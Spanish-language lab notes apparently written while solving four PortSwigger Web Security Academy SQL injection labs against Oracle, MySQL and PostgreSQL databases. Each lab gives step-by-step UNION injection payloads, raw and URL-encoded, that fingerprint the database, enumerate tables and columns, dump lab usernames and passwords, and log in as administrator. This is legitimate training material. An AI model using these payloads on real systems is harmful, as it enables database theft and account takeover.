
EXAMINING THE DATA BASE




			--> Lab: SQL injection attack, querying the database type and version on Oracle

-> Reconocimiento & Objectivo :

Vulnerabilidad en el "product category filter"
Se puede usar el UNION attack para explotar la vulnerabilidad
End gol: Saber la version de la base de datos que se esta usando. 


-> ejecutando el ataque a la maquina: 

1) con burpsuite y fox proxy, vamos a la URL: https://0a78008804a222f980b3807400a300e0.web-security-academy.net/filter?category=Pets

2) capturamos el trafico que esta en burp suite > proxy > HTTP history, en la URL con el parametro "category" lo mandamos al "repeater" de burp suite. 

3) En repeater modificamos los valores del parametro de "category" a: ' . Esto nos devuelve un error 500, mostrando que la pagina es vulnerable a SQL injection 

4) Siempre en category, cambiar el valor por los siguientes strings (nuestro payload) para ver cual funciona: 

'+UNION+SELECT+banner,+NULL+FROM+v$version--

Desde la URL: https://0a78008804a222f980b3807400a300e0.web-security-academy.net/filter?category=Pets+%27+UNION+SELECT+banner,+NULL+FROM+v$version-- 


=> Output: 

CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production




			--> Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
			

-> Reconocimiento & Objectivo :

Vulnerabilidad en el "product category offer" 
Podemos usar Union attack, para obtener resultados desde un query inyectado 
para RESOLVER el lab tenemos que mostrar la version de la base de datos.


-> ejecutando el ataque a la maquina:

1) con burp suite y fox proyx vamos a la URL: https://0aaa00c504c0673f81d8436800d90052.web-security-academy.net/

2) encendemos el capturador de burp suite app y fox proxy en el navegador.  

3) Click en la category de "pets" (damos click en forward en burpsuite hasta finalizar la carga de la pagina) 

4) en burp suite > proxy > http history > click en la peticion que contenga la url "/filter?category=Pets , click derecho y "send to repeter" 

5) en el repetir en la primera linea esta: GET /filter?category=Pets HTTP/1.1 cambiar la url por: GET /filter?category=' HTTP/1.1 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )

6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos: 
'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+
'+UNION+SELECT+NULL,NULL,NULL--+
Nada funciono. Procedemos a continuar con el siguiente paso:  

7) La pagina parece vulnerable a SQL, usaremos varios payloads para ver la version de base de datos
' UNION SELECT banner FROM v$version-- ==> '+UNION+SELECT+banner+FROM+v$version--
' UNION SELECT version FROM v$instance-- ==> '+UNION+SELECT+version+FROM+v$instance--
' UNION SELECT @@version--  ==>  '+UNION+SELECT+%40%40version--+
' UNION SELECT version()--  ==> '+UNION+SELECT+version()--
' UNION SELECT version FROM dual--

Nada funciona excepto este codigo: 

'+UNION+SELECT+@@version,NULL--+

Este query utiliza la función @@version para obtener la versión de la base de datos. La segunda columna tiene un valor NULL para asegurarse de que el query tiene el mismo número de columnas que la consulta original.


--> Output: 

RESPUESTA: '+UNION+SELECT+@@version,NULL--+  ==> 8.0.32-0ubuntu0.20.04.2







			--> Lab: SQL injection attack, listing the database contents on non-Oracle databases
			
-> Reconocimiento & Objectivo :

Vulnerabilidad "SQL injection" en el "product category offer" 
Podemos usar Union attack, para obtener data desde las otras tablas.
La aplicacion tiene un "login function" y una base de datos que contiene una tabla con los nombres de usuario y contrasenas. 

Para RESOLVER el lab: Necesitamos saber cual es el nombre de la tabla que contiene los "usernames y passwords" y el nombre de las columnas que contiene esa data y asi poder obtener la info de todos los usuarios.
Luego necesiamos hacer "Log in" como Administrador.  


-> ejecutando el ataque a la maquina:

1) con burp suite y fox proyx vamos a la URL: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/

2) encendemos el capturador de burp suite app y fox proxy en el navegador.  

3) Click en cualquier "category" e.g. "Gifts" (damos click en forward en burpsuite hasta finalizar la carga de la pagina)

4) en burp suite > proxy > http history > click en la peticion que contenga la url: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/filter?category=Gifts , click derecho y "send to repeter" 

5) en el repetir en la primera linea esta: GET /filter?category=Gifts HTTP/2 cambiar la url por: GET /filter?category=' HTTP/2 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )

6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos:
'+UNION+SELECT+NULL,NULL--+

Esto significa que la respuesta recibida desde el servidor retorna 2 columnas. 

7) Determinando que el "type" de las columnas retornadas: 

Despues de varias pruebas se reconoce que las 2 bases de datos son de tipo "string"
'+UNION+SELECT+'A','A'--+  (2 columnas de tipo string)

- Tambien averiguaremos la version de la base de datos con: 

' UNION SELECT version(), NULL --




8) Listando el nombre de las tablas de la base de datos: (Se sabe que es una Non-Oracle DB, por lo tanto no probaremos con esos comandos de Oracle)

- tenemos resultados con este comando: 

'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+--+

y tambien esto:

'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+--+

- Con ambos se optinen la lista de las tablas en la base de datos, ahora procedemos a
buscar las columnas que contienen "username, passwords" que es la data para hacer log in como 
administrador. 

'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='table_name_here'--+

Con esto podemos ver las columnas contenidas en cada tabla. 


9) Output the list of table names in the database. Ahora vemos la informacion que contienen las columnas: 

Como es una base de datos "PostgresSql" la forma de ver las tablas de la base de datos es: 

"SELECT * FROM information_schema.tables"
* Hay que averiguar los "column names" disponibles para esto: information_schema.tables

* En google buscamos "information_schema.tables postgresql" (en la documentacion de postgres) 
https://www.postgresql.org/docs/current/information-schema.html
> columns > table_name 
Asi con esto sabemos que usar en el "SELECT" para buscar los nombres de todas las tablas y creamos este query: 

' UNION SELECT table_name, NULL FROM information_schema.tables --
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+--


* Haciendo ctrl + f, buscamos la tabla que contenga "users" y el resultado es este: 
"users_yybmap"
Y esta es posiblemente la tabla que contenga la data que buscamos

10) Output the column names of the table. 
Identificada la tabla que posiblemente tenga la info que buscamos ahora veremos los nombres de las tablas contenidas

* En google buscamos "information_schema.columns postgresql"
https://www.postgresql.org/docs/current/infoschema-columns.html
Nos muestra "column_name" segun la documentacion de postgreSQL

Y por lo tanto ahora podemos crear este query: 

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_yybmap' --

URL encoded:
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_yybmap'+--


Ahora ya sabemos el nombre de las columnas de la tabla "users_yybmap"

password_eskcyw, username_vguskp


11) Ahora sabiendo: La posible Tabla que contenga la data (users_yybmap), 
el nombre de las columnas de la tabla (password_eskcyw, username_vguskp),
hay que ver que contienen esas columnas de la siguiente manera:

' UNION SELECT password_eskcyw, username_vguskp FROM users_yybmap --
'+UNION+SELECT+password_eskcyw,+username_vguskp+FROM+users_yybmap+--

El resultado es: 

vntynwelr3vgk9nyiwiu
	wiener
vgym2pam0ggg1rbf2col
	carlos
49pbluaujp9eg547yg7l
	administrator

12) Tomamos la contrasena y el user de administrador, y hacemos login como Administrator








			--> Lab: SQL injection attack, listing the database contents on Oracle

-> Reconocimiento & Objectivo :

Vulnerabilidad "SQL injection" en el "product category offer" 
Podemos usar Union attack, para obtener data desde las otras tablas.
La aplicacion tiene un "login function" y una base de datos que contiene una tabla con los nombres de usuario y contrasenas. 

Para RESOLVER el lab: Necesitamos saber cual es el nombre de la tabla que contiene los "usernames y passwords" y el nombre de las columnas que contiene esa data y asi poder obtener la info de todos los usuarios.
Luego necesiamos hacer "Log in" como Administrador.  


-> ejecutando el ataque a la maquina:

1) con burp suite y fox proyx vamos a la URL: https://0a7c002e04d7841180f62607002b0060.web-security-academy.net/filter?category=Gifts

2) encendemos el capturador de burp suite app y fox proxy en el navegador.  

3) Click en cualquier "category" e.g. "Gifts" (damos click en forward en burpsuite hasta finalizar la carga de la pagina)

4) en burp suite > proxy > http history > click en la peticion que contenga la url: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/filter?category=Gifts , click derecho y "send to repeter" 

5) en el repetir en la primera linea esta: GET /filter?category=Gifts HTTP/2 cambiar la url por: GET /filter?category=' HTTP/2 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )

6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos:

'+UNION+SELECT+NULL,NULL+FROM+dual--+
Con esto verificamos que tiene retorna 2 columnas.

- Examninando el tipo de columnas: 

'+UNION+SELECT+'a','a'+FROM+dual--+
Con esto comprobamos que las 2 columnas retornadas son de tipo "string".


7) comprobando la version de base de datos
(sabemos que es una tipo oracle pero para estar seguros)

'+UNION+SELECT+banner,NULL+FROM+v$version--+
Con este comando podemos ver a seguridad la version de base de datos.

Resultado: 

CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production


8) Mostrando la lista de tablas de la base de datos: 

Para ver las tablas de la base de datos en oracle debemos usar: SELECT * FROM all_tables
por lo tanto crearemos el comando: 

' UNION SELECT NULL, table_name FROM all_tables --
'+UNION+SELECT+NULL,+table_name+FROM+all_tables+--

Nos devuelve una lista larga de tablas disponibles, pero la mas probable es la esta: 

"USERS_FVOPAX"


9) Mostrando las columnas contenidas en la tabla: 
Identificada la tabla que posiblemente tenga la info que buscamos ahora veremos los nombres de las tablas contenidas

- Segun la documentacion de Oracle la forma de ver las columnas contenidas en una tabla es la siguiente: 
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'


- Buscando en google" "all_tab_columns": nos muestra las tablas disponibles: 
https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html#GUID-F218205C-7D76-4A83-8691-BFD2AD372B63

"COLUMN_NAME" alli deben estar el nombre de las columnas


- Por lo tanto usaremos el siguiente SQL injection command para ver las columnas de nuestra tabla:

' UNION SELECT NULL, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_FVOPAX'-- 

url enconded: 
'+UNION+SELECT+NULL,+COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_FVOPAX'--+

- resultado: 
PASSWORD_NAUAFZ, USERNAME_MYAZOZ

Estos son los nombres de las columnas contenidas en la tabla "USERS_FVOPAX"


10) Mostrando el contenido de las columnas "PASSWORD_NAUAFZ, USERNAME_MYAZOZ" de la tabla "USERS_FVOPAX"
Sabiendo el nombre de las columnas que parecen ser las que contienen la data que necesitamos 
procdemos a ver su contenido usando el comando: 

' UNION SELECT PASSWORD_NAUAFZ, USERNAME_MYAZOZ FROM USERS_FVOPAX --

url encoded:
'+UNION+SELECT+PASSWORD_NAUAFZ,+USERNAME_MYAZOZ+FROM+USERS_FVOPAX+--

- Resultado: 

74h7ndydhimxio8esqmx
	carlos
mcv0r0jn75e8tqb0ywvv
	administrator
vuv9zwat9llc6g9ruxv2
	wiener

11) Hacemos log in como administradores usando la contrasena. 






